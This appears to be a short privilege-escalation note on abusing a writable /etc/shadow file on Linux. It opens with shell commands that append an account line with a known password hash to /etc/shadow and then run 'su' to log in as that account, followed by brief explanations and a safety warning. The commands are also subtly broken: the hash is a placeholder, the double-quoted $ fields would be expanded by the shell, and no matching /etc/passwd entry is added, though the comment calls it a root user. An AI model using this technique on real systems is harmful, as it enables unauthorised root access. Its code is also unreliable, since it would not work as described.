# Generate a hash for 'password' (e.g., using 'openssl passwd -1 password')
$1$salt$hash
# Add a new root user 'newroot' with a known password
echo "newroot:$1$salt$hash:18706:0:99999:7::" >> /etc/shadow
# Then 'su newroot' and use 'password'
su newroot

/etc/shadow Contents

Stores encrypted passwords, password aging, and account expiration. It's designed to be highly restricted for security.

The Critical Vulnerability

A writable /etc/shadow allows an attacker to inject or replace password hashes for any user, including root, effectively taking control of their authentication credentials.

Generating Hashes

Tools like openssl passwd or Python's crypt module can generate compatible password hashes for insertion into /etc/shadow.

Safety Note

Modifying /etc/shadow incorrectly is extremely dangerous and can lead to complete system lockout. Always exercise extreme caution.
